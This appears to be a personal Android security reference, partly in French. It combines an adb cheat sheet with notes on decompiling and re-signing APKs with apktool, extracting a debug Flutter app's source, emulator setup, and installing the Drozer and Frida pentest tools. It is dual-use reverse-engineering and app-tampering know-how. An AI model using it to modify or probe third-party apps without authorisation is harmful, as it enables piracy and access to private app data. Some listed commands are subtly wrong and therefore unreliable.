<li><a href="https://3os.org/android/adb-cheat-sheet/#push-a-file-to-download-folder-of-the-android-device">adb (Android Debug Bridge) cheatsheet</a></li>
</ul>
<h1 id="package-installation"><a class="header" href="#package-installation">Package Installation</a></h1>
<ul>
<li><a href="tools/android/adb/index.html#basic">Basic Command</a></li>
<li><a href="tools/android/adb/index.html#activities">Some Activities</a></li>
<li><a href="tools/android/adb/index.html#install">Package Installation</a></li>
<li><a href="tools/android/adb/index.html#path">Path</a></li>
<li><a href="tools/android/adb/index.html#file_operations">File Operations</a></li>
<li><a href="tools/android/adb/index.html#phone">Phone Info</a></li>
<li><a href="tools/android/adb/index.html#package_info">Package Info</a></li>
<li><a href="tools/android/adb/index.html#device_related_commands">Device Related Commands</a></li>
<li><a href="tools/android/adb/index.html#intents">Intents</a></li>
<li><a href="tools/android/adb/index.html#log">Log</a></li>
<li><a href="tools/android/adb/index.html#permissions">Permissions</a></li>
<li><a href="tools/android/adb/index.html#getprop">System Informations</a></li>
<li><a href="tools/android/adb/index.html#proxy">Proxy</a></li>
<li><a href="tools/android/adb/index.html#input">Input &amp; Actions</a></li>
<li><a href="tools/android/adb/index.html#activities">Start activities</a></li>
<li><a href="tools/android/adb/index.html#shellprocess">Shell process management</a></li>
<li><a href="tools/android/adb/index.html#dozemode_standby">Optimize for Doze and App Standby</a></li>
<li><a href="tools/android/adb/index.html#service">Service</a></li>
</ul>
<h1 id="basic-command"><a class="header" href="#basic-command"><a name="basic"></a>Basic Command</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb devices</td>
            <td>Lists connected devices</td>
        </tr>
        <tr>
            <td>adb connect 192.168.2.1</td>
            <td>Connects to adb device over network</td>
        </tr>
        <tr>
            <td>adb root</td>
            <td>Restarts adbd with root permissions</td>
        </tr>
        <tr>
            <td>adb start-server</td>
            <td>Starts the adb server</td>
        </tr>
        <tr>
            <td>adb kill-server</td>
            <td>Kills the adb server</td>
        </tr>
        <tr>
            <td>adb reboot</td>
            <td>Reboots the device</td>
        </tr>
        <tr>
            <td>adb shell</td>
            <td>Starts the backround terminal</td>
        </tr>
        <tr>
            <td>adb devices -l</td>
            <td>List of devices by product/model</td>
        </tr>
        <tr>
            <td>adb -s <code>&lt;deviceName&gt; &lt;command&gt;</code></td>
            <td>Redirect command to specific device</td>
        </tr>
        <tr>
            <td>adb –d <code>&lt;command&gt;</code></td>
            <td>Directs command to only attached USB device</td>
        </tr>
        <tr>
            <td>adb –e <code>&lt;command&gt;</code></td>
            <td>Directs command to only attached emulator</td>
        </tr>
    </tbody>
</table>
<h1 id="package-installation-1"><a class="header" href="#package-installation-1"><a name="install"></a>Package Installation</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell install</strong> <code>&lt;apk&gt;</code></td>
            <td>Install app</td>
        </tr>
        <tr>
            <td><strong>adb shell install <code>&lt;path&gt;</code></strong></td>
            <td>Install app from phone path</td>
        </tr>
        <tr>
            <td><strong>adb shell install -r <code>&lt;path&gt;</code></strong></td>
            <td>Install app from phone path</td>
        </tr>
        <tr>
            <td><strong>adb shell uninstall <code>&lt;name&gt;</code></strong></td>
            <td>Remove the app</td>
        </tr>
    </tbody>
</table>
<h1 id="path"><a class="header" href="#path"><a name="path"></a>Path</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell <code>ls</code></strong></td>
            <td>List directory contents</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>ls -s</code></strong></td>
            <td>Print size of each file</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>ls -R</code></strong></td>
            <td>List subdirectories recursively</td>
        </tr>
        <tr>
            <td><strong>adb shell pm path <code>&lt;package name&gt;</code></strong></td>
            <td><strong>Get full path of a package</strong></td>
        </tr>
        <tr>
            <td><strong>adb shell pm list packages -f</strong></td>
            <td><strong>Lists all the packages and full paths</strong></td>
        </tr>
        <tr>
            <td><strong>adb shell pm list packages | sed 's/.*://g'</strong></td>
            <td><strong>Get all available packages</strong></td>
        </tr>
    </tbody>
</table>
<h1 id="file-operations"><a class="header" href="#file-operations"><a name="file_operations"></a>File Operations</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb push <code>&lt;local&gt; &lt;remote&gt;</code></strong></td>
            <td><strong>Copy file/dir to device</strong></td>
        </tr>
        <tr>
            <td><strong>adb pull <code>&lt;remote&gt; &lt;local&gt;</code></strong></td>
            <td><strong>Copy file/dir from device</strong></td>
        </tr>
        <tr>
            <td>run-as <code>&lt;package&gt;</code> cat <code>&lt;file&gt;</code></td>
            <td>Access the private package files</td>
        </tr>
    </tbody>
</table>
<h1 id="phone-info"><a class="header" href="#phone-info"><a name="phone"></a>Phone Info</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb get-statе</td>
            <td>Print device state</td>
        </tr>
        <tr>
            <td>adb get-serialno</td>
            <td>Get the serial number</td>
        </tr>
        <tr>
            <td>adb shell dumpsys iphonesybinfo</td>
            <td>Get the IMEI</td>
        </tr>
        <tr>
            <td>adb shell netstat</td>
            <td>List TCP connectivity</td>
        </tr>
        <tr>
            <td>adb shell pwd</td>
            <td>Print current working directory</td>
        </tr>
        <tr>
            <td>adb shell dumpsys battery</td>
            <td>Battery status</td>
        </tr>
        <tr>
            <td>adb shell pm list features</td>
            <td>List phone features</td>
        </tr>
        <tr>
            <td>adb shell service list</td>
            <td>List all services</td>
        </tr>
        <tr>
            <td>adb shell dumpsys activity <code>&lt;package&gt;/&lt;activity&gt;</code></td>
            <td>Activity info</td>
        </tr>
        <tr>
            <td>adb shell ps</td>
            <td>Print process status</td>
        </tr>
        <tr>
            <td>adb shell wm size</td>
            <td>Displays the current screen resolution</td>
        </tr>
    </tbody>
</table>
<h1 id="package-info"><a class="header" href="#package-info"><a name="package_info"></a>Package Info</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb shell list packages</td>
            <td>Lists package names</td>
        </tr>
        <tr>
            <td>adb shell list packages -r</td>
            <td>Lists package name + path to apks</td>
        </tr>
        <tr>
            <td>adb shell list packages -3</td>
            <td>Lists third party package names</td>
        </tr>
        <tr>
            <td>adb shell list packages -s</td>
            <td>Lists only system packages</td>
        </tr>
        <tr>
            <td>adb shell list packages -u</td>
            <td>Lists package names + uninstalled</td>
        </tr>
        <tr>
            <td>adb shell dumpsys package packages</td>
            <td>Lists info on all apps</td>
        </tr>
        <tr>
            <td>adb shell dump <code>&lt;name&gt;</code></td>
            <td>Lists info on one package</td>
        </tr>
        <tr>
            <td>adb shell path <code>&lt;package&gt;</code></td>
            <td>Path to the apk file</td>
        </tr>
    </tbody>
</table>
<h1 id="device-related-commands"><a class="header" href="#device-related-commands"><a name="device_related_commands"></a>Device Related Commands</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb reboot-recovery</td>
            <td>Reboot device into recovery mode</td>
        </tr>
        <tr>
            <td>adb reboot fastboot</td>
            <td>Reboot device into recovery mode</td>
        </tr>
        <tr>
            <td>adb shell screencap -p "/path/to/screenshot.png"</td>
            <td>Capture screenshot</td>
        </tr>
        <tr>
            <td>adb shell screenrecord "/path/to/record.mp4"</td>
            <td>Record device screen</td>
        </tr>
        <tr>
            <td>adb backup -apk -all -f backup.ab</td>
            <td>Backup settings and apps</td>
        </tr>
        <tr>
            <td>adb backup -apk -shared -all -f backup.ab</td>
            <td>Backup settings, apps and shared storage</td>
        </tr>
        <tr>
            <td>adb backup -apk -nosystem -all -f backup.ab</td>
            <td>Backup only non-system apps</td>
        </tr>
        <tr>
            <td>adb restore backup.ab</td>
            <td>Restore a previous backup</td>
        </tr>
        <tr>
            <td>-------</td>
            <td>-----------</td>
        </tr>
        <tr>
            <td>adb shell am start -a android.intent.action.VIEW -d URL</td>
            <td>Opens URL</td>
        </tr>
        <tr>
            <td>adb shell am start -t image/* -a android.intent.action.VIEW</td>
            <td>Opens gallery</td>
        </tr>
        <tr>
            <td>adb shell monkey -p app.package.name -v 1</td>
            <td>Starts the specified package</td>
        </tr>
    </tbody>
</table>
<h1 id="intents"><a class="header" href="#intents"><a name="intents"></a>Intents</a></h1>
<p><a href="https://developer.android.com/studio/command-line/shell.html#am">am Command</a></p>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>am start -a android.intent.action.VIEW -d https://github.com</td>
            <td>URI</td>
        </tr>
        <tr>
            <td>am start -a "android.intent.action.SEND" --es "android.intent.extra.TEXT" "Hello World" -t "text/plain"</td>
            <td>Mime Type and Extra string</td>
        </tr>
        <tr>
            <td>am start -n "your.application.packagename/path.to.the.Activity"</td>
            <td>Activity</td>
        </tr>
        <tr>
            <td>am start -n "your.application.packagename/path.to.the.Activity" - e "key" "data"</td>
            <td>Activity with extras</td>
        </tr>
        <tr>
            <td>am startservice -n "com.example.application/.BackgroundService"</td>
            <td>Service</td>
        </tr>
        <tr>
            <td>am broadcast -a "android.intent.action.PACKAGE_FIRST_LAUNCH" -d "com.example.application"</td>
            <td>Broadcast with Action</td>
        </tr>
        <tr>
            <td>
            am broadcast -a com.google.android.c2dm.intent.RECEIVE 
                         -n <code>&lt;YOUR_PACKAGE_NAME&gt;/&lt;YOUR_RECEIVER_NAME&gt;</code> 
                         -e "<code>&lt;EXTRA_KEY_1&gt;</code>" "<code>&lt;EXTRA_VALUE_1&gt;</code>"
                         -e "<code>&lt;EXTRA_KEY_2&gt;</code>" "<code>&lt;EXTRA_VALUE_1&gt;</code>"
            </td>
            <td>Notification (1)</td>
        </tr>
    </tbody>
</table>
<p>(1) <a href="http://stackoverflow.com/questions/27800369/simulating-android-gcm">stackoverflow</a></p>
<h1 id="log"><a class="header" href="#log"><a name="log"></a>Log</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb logcat <code>[options] [filter] [filter]</code></strong></td>
            <td><strong>View device log</strong></td>
        </tr>
        <tr>
            <td>adb bugreport</td>
            <td>Print bug reports</td>
        </tr>
        <tr>
            <td>adb logcat</td>
            <td>Starts printing log messages to stdout</td>
        </tr>
        <tr>
            <td>adb logcat -g</td>
            <td>Displays current log buffer sizes</td>
        </tr>
        <tr>
            <td>adb logcat -G <code>&lt;size&gt;</code></td>
            <td>Sets the buffer size (K or M)</td>
        </tr>
        <tr>
            <td>adb logcat -c</td>
            <td>Clears the log buffers</td>
        </tr>
        <tr>
            <td>adb logcat *:V</td>
            <td>Enables ALL log messages (verbose)</td>
        </tr>
        <tr>
            <td>adb logcat -f <code>&lt;filename&gt;</code></td>
            <td>Dumps to specified file</td>
        </tr>
        <tr>
            <td>adb logcat -v color <code>"com.rust_sample.org:I"</code> <code>"*:S"</code></td>
            <td>Filter logcat for package name com.rust_sample.org only in <STRONG>INFO</STRONG></td>
        </tr>
    </tbody>
</table>
<h3 id="example"><a class="header" href="#example">Example</a></h3>
<ul>
<li></li>
</ul>
<pre><code class="language-shell">$ adb logcat -G 16M
$ adb logcat *:V &gt; output.log
</code></pre>
<ul>
<li>Logcat for specific package name</li>
</ul>
<pre><code class="language-shell">$ adb logcat -c &amp;&amp; adb logcat --pid=$(adb shell pidof -s fr.dghack2023.android_mirrors)
</code></pre>
<h1 id="permissions"><a class="header" href="#permissions"><a name="permissions"></a>Permissions</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb shell permissions groups</td>
            <td>List permission groups definitions</td>
        </tr>
        <tr>
            <td>adb shell list permissions -g -r</td>
            <td>List permissions details</td>
        </tr>
    </tbody>
</table>
<h1 id="system-informations"><a class="header" href="#system-informations"><a name="getprop"></a>System Informations</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell getprop <code>ro.build.version.release</code></strong></td>
            <td>Get Build Version of Release Mode</td>
        </tr>
        <tr>
            <td><strong>adb shell getprop <code>ro.product.cpu.abi</code></strong></td>
            <td>Get current ABI</td>
        </tr>
        <!-- <tr>
            <td><strong>adb shell getprop <code></code></strong></td>
            <td></td>
        </tr> -->
    </tbody>
</table>
<h1 id="proxy"><a class="header" href="#proxy"><a name="proxy"></a>Proxy</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb shell settings put global http_proxy <code>&lt;address&gt;:&lt;port&gt;</code></td>
            <td>Set network proxy</td>
        </tr>
        <tr>
            <td>adb shell settings put global http_proxy :0
</td>
            <td>Disable network proxy</td>
        </tr>
    </tbody>
</table>
<h1 id="input--actions"><a class="header" href="#input--actions"><a name="input"></a>Input &amp; Actions</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb shell input text S3cr37 && adb shell input keyevent 66</td>
            <td>Input text 'S3cr37' then press [ENTER]</td>
        </tr>        
        <tr>
            <td>adb shell input swipe 540 1600 540 100 150</td>
            <td>Swipe up (SCREEN not been closed)</td>
        </tr>        
        <tr>
            <td>adb shell input tap X Y</td>
            <td>Click on screen at coordinate [X, Y]</td>
        </tr>   
        </tbody>
</table>     
<h1 id="start-activities"><a class="header" href="#start-activities"><a name="activities"></a>Start activities</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>adb shell am start -n com.package.name/com.package.name.ActivityName</td>
            <td>Throught package name (Manifest) </td>
        </tr>
        <tr>
            <td>am start -a com.example.ACTION_NAME -n com.package.name/com.package.name.ActivityName </td>
            <td>Intent-filter</td>
        </tr>
        <tr>
            <td>adb shell monkey -p your.app.package.name 1</td>
            <td>Androiderson tips</td>
        </tr>
    </tbody>
</table>
<h1 id="shell-process-management"><a class="header" href="#shell-process-management"><a name="shellprocess"></a>Shell process management</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell pidof <code>-s fr.dghack2023.android_mirrors</code></strong></td>
            <td>Get PID of application name (running)</td>
        </tr>
    </tbody>
</table>
<h1 id="optimize-for-doze-and-app-standby"><a class="header" href="#optimize-for-doze-and-app-standby"><a name="dozemode_standby"></a><a href="https://developer.android.com/training/monitoring-device-state/doze-standby">Optimize for Doze and App Standby</a></a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell <code>dumpsys </code></strong></td>
            <td></td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys battery | grep powered</code></strong></td>
            <td>Battery powered state</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys battery unplug</code></strong></td>
            <td>Unplug battery</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys battery reset</code></strong></td>
            <td>Reset battery</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle</code></strong></td>
            <td>Dump Doze mode info</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle enable</code></strong></td>
            <td>Enable Doze mode (may be required on Android Emulator)</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle get light</code></strong></td>
            <td>Get status of Light Doze mode</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle get deep</code></strong></td>
            <td>Get status of Deep Doze mode</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle step light</code></strong></td>
            <td>Enter Light Doze mode (should be called several times to pass all phases)</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys deviceidle step deep</code></strong></td>
            <td>Enter Deep Doze mode (should be called several times to pass all phases)</td>
        </tr>
    </tbody>
</table>
<p>================================================================</p>
<ul>
<li><a href="tools/android/adb/index.html#service">Service</a></li>
</ul>
<h1 id="service"><a class="header" href="#service"><a name="service"></a>Service</a></h1>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>adb shell <code>dumpsys activity service</code></strong></td>
            <td>Allow to list running services</td>
        </tr>
        <tr>
            <td><strong>adb shell <code>dumpsys activity</code> com.service.function</strong></td>
            <td>Allow to know the services *com.service.function* status.</td>
        </tr>
    </tbody>
</table>
<p>============================================================</p>
<h3 id="get-screen-state-and-locked-state-to-be-verified"><a class="header" href="#get-screen-state-and-locked-state-to-be-verified">Get Screen state and locked state (To be verified)</a></h3>
<blockquote>
<p>adb shell service call trust 7</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-apktool-for-reverse-engineering"><a class="header" href="#android-apktool-for-reverse-engineering">Android Apktool for Reverse Engineering</a></h1>
<p>A tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc.</p>
<p>It is <code>NOT</code> intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms, analyzing applications and much more.</p>
<h2 id="download-and-documentation"><a class="header" href="#download-and-documentation">Download and Documentation</a></h2>
<p><a href="https://ibotpeaches.github.io/Apktool/" title="Apktool Official Website">Official Apktool Website</a>{target=_blank}</p>
<h2 id="apktool"><a class="header" href="#apktool">APKTool</a></h2>
<ul>
<li>Decoding code</li>
</ul>
<pre><code class="language-shell">$ apktool d foo.jar
# decodes foo.jar to foo.jar.out folder

$ apktool decode foo.jar
# decodes foo.jar to foo.jar.out folder

$ apktool d bar.apk
# decodes bar.apk to bar folder

$ apktool decode bar.apk
# decodes bar.apk to bar folder

$ apktool d bar.apk -o baz
# decodes bar.apk to baz folder
</code></pre>
<ul>
<li>Building</li>
</ul>
<pre><code class="language-shell">$ apktool b foo.jar.out
# builds foo.jar.out folder into foo.jar.out/dist/foo.jar

$ apktool build foo.jar.out
# builds foo.jar.out folder into foo.jar.out/dist/foo.jar

$ apktool b bar
# builds bar folder into bar/dist/bar.apk

$ apktool b .
# builds current directory into ./dist

$ apktool b bar -o new_bar.apk
# builds bar folder into new_bar.apk

$ apktool b bar.apk
# WRONG: brut.androlib.AndrolibException: brut.directory.PathNotExist: apktool.yml
# Must use folder, not apk/jar file
</code></pre>
<h2 id="how-to-sign-apk-after-compile"><a class="header" href="#how-to-sign-apk-after-compile">How to Sign APK After Compile</a></h2>
<p>In order to install modified APK on Android device, you need to sign it with a certificate. Android APK won't be signed by default. You need to sign it manually.</p>
<p>Install <strong>apksigner</strong></p>
<pre><code class="language-bash">apt install -y apksigner
</code></pre>
<p>Create certificate at the same folder you've compiled your modified APK</p>
<pre><code class="language-bash">keytool -genkey -v -keystore keystore.jks -keyalg RSA -keysize 2048 -validity 10000
</code></pre>
<p>Enter A password (we will need it to singe the APK), enter any data you wish for the certificate information. At the end enter <strong>'y'</strong> at the end to create the certificate.</p>
<p>Now we should have 2 files: your.apk, keystore.jks. The only step left is to singe the APK with new certificate.</p>
<pre><code class="language-bash">apksigner sign --ks keystore.jks your.apk
</code></pre>
<p>When installing the APK you will be prompted with a warning of &quot;unknown certificate&quot; just hit Install.</p>
<!-- appendices -->
<!-- end appendices -->
<div style="break-before: page; page-break-before: always;"></div><h1 id="dex2jar"><a class="header" href="#dex2jar">Dex2Jar</a></h1>
<p>Permet de convertir un APK en JAR.</p>
<p>Source:</p>
<ul>
<li><a href="https://securehoney.net/blog/how-to-dissect-android-simplelocker-ransomware.html">How To Dissect Android Simplelocker Ransomware</a></li>
<li><a href="https://securehoney.net/blog/creating-an-antidote-for-android-simplelocker-ransomware.html">Creating An Antidote For Android Simplelocker Ransomware</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="devtool-flutter"><a class="header" href="#devtool-flutter">Devtool FLUTTER</a></h1>
<p>Dans le cadre d'un APK compilé <strong>DEBUG</strong>, il est possible d'acceder au code source en ligne : </p>
<p>1- installation de l’apk sur l’appareil android :</p>
<pre><code class="language-shell">$ adb install path/to/apk
</code></pre>
<p>2- lancement de l’apk sur l’appareil</p>
<p>3- affichez les logs pour trouver l’observatory :</p>
<pre><code class="language-shell">$ adb logcat | grep flutter
</code></pre>
<p>exemple :</p>
<pre><code>07-16 18:24:28.887 30621 30691 I flutter : Observatory listening on http://127.0.0.1:37405/XXXXXXX=/
</code></pre>
<p>4- copiez le port de l’obsevatory, dans l’exemple c’est 37405</p>
<p>5- configurez la redirection de port sur la machine :</p>
<pre><code class="language-shell">$ adb forward tcp:37405 tcp:37405
</code></pre>
<p>(remplacez 37405 par votre port)</p>
<p>5- lancez le devtool avec :</p>
<pre><code class="language-shell">$ dart devtools
</code></pre>
<p>et ajoutez le lien de l’observatory dans l’interface.</p>
<p>Il est possible d’acceder au code source depuis cette interface.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="install-and-create-emulators-using-avdmanager-and-sdkmanager"><a class="header" href="#install-and-create-emulators-using-avdmanager-and-sdkmanager">Install and Create Emulators using AVDMANAGER and SDKMANAGER</a></h1>
<h2 id="tldr"><a class="header" href="#tldr">TL;DR</a></h2>
<p>For an emulator that mimics a Pixel 5 Device with Google APIs and ARM/x86_64 architecture:</p>
<ol>
<li>List All System Images Available for Download:</li>
</ol>
<pre><code class="language-shell">$ sdkmanager --list | grep system-images
</code></pre>
<ol start="2">
<li>Install platform tools, build tools, android platform:</li>
</ol>
<pre><code class="language-shell">$ echo &quot;yes&quot;  | sdkmanager &quot;platform-tools&quot; &quot;build-tools;31.0.0&quot; &quot;platforms;android-31&quot;
</code></pre>
<ol start="2">
<li>Install system images:</li>
</ol>
<pre><code class="language-shell">$ echo &quot;yes&quot; | sdkmanager &quot;system-images;android-31;google_apis;x86_64&quot;

</code></pre>
<ol start="3">
<li>Create Emulator:</li>
</ol>
<pre><code class="language-shell">echo &quot;no&quot; | avdmanager --verbose create avd \
                --force \
                --name &quot;pixel_5_api30_google_atd_emulator&quot; \
                --package &quot;system-images;android-31;google_apis;x86_64&quot; \
                --tag &quot;google_atd&quot; \
                --abi &quot;arm64-v8a&quot; \
                --device &quot;pixel_5&quot;
</code></pre>
<p>I recommend always using the new <code>google_atd</code> or <code>aosp_atd</code> images when possible. In my benchmarks, they are about 40% more efficient than the <code>google_apis</code> image.</p>
<p><strong>Note</strong>: Available device (<code>--device</code>) list:</p>
<pre><code class="language-shell">$ avdmanager list device
</code></pre>
<p>Passing in a device will make the Emulator settings (usually found in the <code>~/.android/avd/emulator.avd/config.ini</code> file) try to mimic that device. It is not actually the device. But, certain settings like pixel density, resolution, memory, partition size, etc will be changed. Generally the lower resolution devices will be less taxing on your CPU resources on CI, and are preferred especially without GPU/Hardware acceleration.</p>
<ol start="4">
<li>Run Emulator:</li>
</ol>
<pre><code class="language-shell">$ emulator @generic_api30_aosp_atd_emulator &amp;
</code></pre>
<p>or </p>
<pre><code class="language-shell">emulator @pixel_5_google_atd_emulator &amp;
</code></pre>
<ol start="5">
<li>Available adv</li>
</ol>
<pre><code class="language-shell">$ avdmanager list avd
</code></pre>
<h3 id="aliases"><a class="header" href="#aliases">Aliases</a></h3>
<p>Add aliases to your <code>~/.zshrc</code> or <code>~/.bashrc</code> to run the emulators with parameters more easily. </p>
<pre><code class="language-bash">alias pixel_5_wiped='emulator @pixel_5 -no-boot-anim -netdelay none -no-snapshot -wipe-data &amp;'
</code></pre>
<h3 id="starting-multiple-emulators"><a class="header" href="#starting-multiple-emulators">Starting multiple emulators</a></h3>
<p>You can pass the <code>-read-only</code> parameter when starting up an emulator </p>
<pre><code class="language-shell">$ emulator @pixel_5 -read-only
</code></pre>
<p>to run multiple devices at the same time.</p>
<h3 id="other"><a class="header" href="#other">Other</a></h3>
<ol>
<li>aosp_atd and google_atd system images are only available on x86 and ARM architecture at API level 30.</li>
</ol>
<p>See also: https://android-developers.googleblog.com/2021/10/whats-new-in-scalable-automated-testing.html</p>
<pre><code class="language-shell">$ sdkmanager --list | grep atd
  system-images;android-30;aosp_atd;arm64-v8a                                              | 1            | AOSP ATD ARM 64 v8a System Image
  system-images;android-30;aosp_atd;x86                                                    | 1            | AOSP ATD Intel x86 Atom System Image
  system-images;android-30;google_atd;arm64-v8a                                            | 1            | Google APIs ATD ARM 64 v8a System Image
  system-images;android-30;google_atd;x86                                                  | 1            | Google APIs ATD Intel x86 Atom System Image
</code></pre>
<h2 id="ensure-path-is-correct"><a class="header" href="#ensure-path-is-correct">ensure PATH is correct</a></h2>
<p>(if studio is in /opt/android-studio, and SDKs etc under ~/Android/Sdk):</p>
<pre><code>ANDROID_STUDIO_LOC=/opt/android-studio
ANDROID_SDK_ROOT=~/Android/Sdk
PATH=$ANDROID_SDK_ROOT/cmdline-tools/latest/bin:$ANDROID_STUDIO_LOC/bin:$ANDROID_SDK_ROOT/emulator:$ANDROID_SDK_ROOT/tools:$ANDROID_SDK_ROOT/platform-tools:$PATH
</code></pre>
<h2 id="docs"><a class="header" href="#docs">Docs</a></h2>
<p>See: <a href="https://developer.android.com/studio/run/emulator-commandline">Google's Emulator CLI Documentation</a> for more info.</p>
<p>See: <a href="https://developer.android.com/studio/command-line/avdmanager">Google's AVDManager Documentation</a> for more info.</p>
<p>See: <a href="https://developer.android.com/studio/command-line/sdkmanager">Google's SDKManager Documentation</a> for more info.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="avdmanager-android-virtual-device-manager"><a class="header" href="#avdmanager-android-virtual-device-manager">AVDManager (Android Virtual Device Manager)</a></h1>
<h2 id="android-emulator-crash"><a class="header" href="#android-emulator-crash">Android Emulator Crash</a></h2>
<h3 id="load-libvulkanso-failed"><a class="header" href="#load-libvulkanso-failed"><code>load libvulkan.so: failed</code></a></h3>
<ul>
<li><a href="https://stackoverflow.com/questions/68741533/android-emulator-does-not-start-after-arctic-fox-upgrade-libvulkan-so-failed">Android Emulator does not start after Arctic Fox upgrade, libvulkan.so: failed</a></li>
</ul>
<p>Go to emulator folder then change <code>gpu</code> mode:</p>
<pre><code class="language-shell">$ cd $HOME/.android/avd/&lt;EMULATOR-LABEL&gt;.avd
$ sed -i 's/hw.gpu.mode = auto/hw.gpu.mode = guest/g' ./config.ini
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="drozer"><a class="header" href="#drozer">Drozer</a></h1>
<p>Drozer is a good tool for simulating a rogue application. F-Secure stopped its development, but it still can be used in your penetration test without any problems. From their GitHub page, there is an <a href="https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">APK</a> that should be installed on the device. The command is</p>
<pre><code class="language-shell">$ adb install drozer-agent-2.3.4.apk
</code></pre>
<p>Drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps’ IPC endpoints, and the underlying OS. Even though it is decommissioned and out of development, I still use it as a go-to tool when it comes to mobile pentesting. More details can be found on their <a href="https://github.com/WithSecureLabs/drozer">GitHub</a>.</p>
<pre><code class="language-shell">$ wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer_2.4.4.deb
$ sudo dpkg -i drozer-2.4.4.deb
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="frida"><a class="header" href="#frida">Frida</a></h1>
<h2 id="frida-tools"><a class="header" href="#frida-tools">Frida Tools</a></h2>
<h3 id="frida-ps"><a class="header" href="#frida-ps">frida-ps</a></h3>
<ul>
<li>Get the list of running processes/applications</li>
</ul>
<pre><code class="language-shell"># -U option for USB devices or emulators
$ frida-ps -U
</code></pre>
<ul>
<li>Get the list of installed applications with -i option</li>
</ul>
<pre><code class="language-shell">$ frida-ps -U -i
</code></pre>
<h2 id="frida-cli"><a class="header" href="#frida-cli">Frida CLI</a></h2>
<ul>
<li>By default, Frida tries to attach to a running process</li>
</ul>
<pre><code class="language-shell">$ frida -U com.android.chrome
</code></pre>
<ul>
<li>To spawn an application, use the -f option as follow</li>
</ul>
<pre><code class="language-shell">$ frida -U -f com.android.chrome
</code></pre>
<ul>
<li>By default, the process is paused</li>
</ul>
<pre><code class="language-shell">$ frida -U -f com.android.chrome --no-pause
</code></pre>
<ul>
<li>Short usefull command</li>
</ul>
<pre><code class="language-shell">$ frida -U -l ./&lt;script&gt;.js -p `adb shell pidof -s &lt;PACKAGE_NAME&gt;`
</code></pre>
<h2 id="frida-scripting"><a class="header" href="#frida-scripting">Frida Scripting</a></h2>
<ul>
<li>
<p>Python bindings are provided with Frida</p>
<ul>
<li>However, the hooks need to be written in JavaScript :(</li>
</ul>
</li>
<li>
<p>Here are the basics Frida functions</p>
<ul>
<li>Java.perform(function() {//your code here});
<ul>
<li>Perform code instrumentation inside the Java code</li>
</ul>
</li>
<li>Java.use(class_name)
<ul>
<li>Use a specific Java class</li>
</ul>
</li>
<li>overload
<ul>
<li>Overload a specific method (functions with different prototypes)</li>
</ul>
</li>
<li>implementation
<ul>
<li>Tamper the implementation of the selected method</li>
</ul>
</li>
</ul>
</li>
<li>
<p>The most convenient way is to use scripts</p>
</li>
</ul>
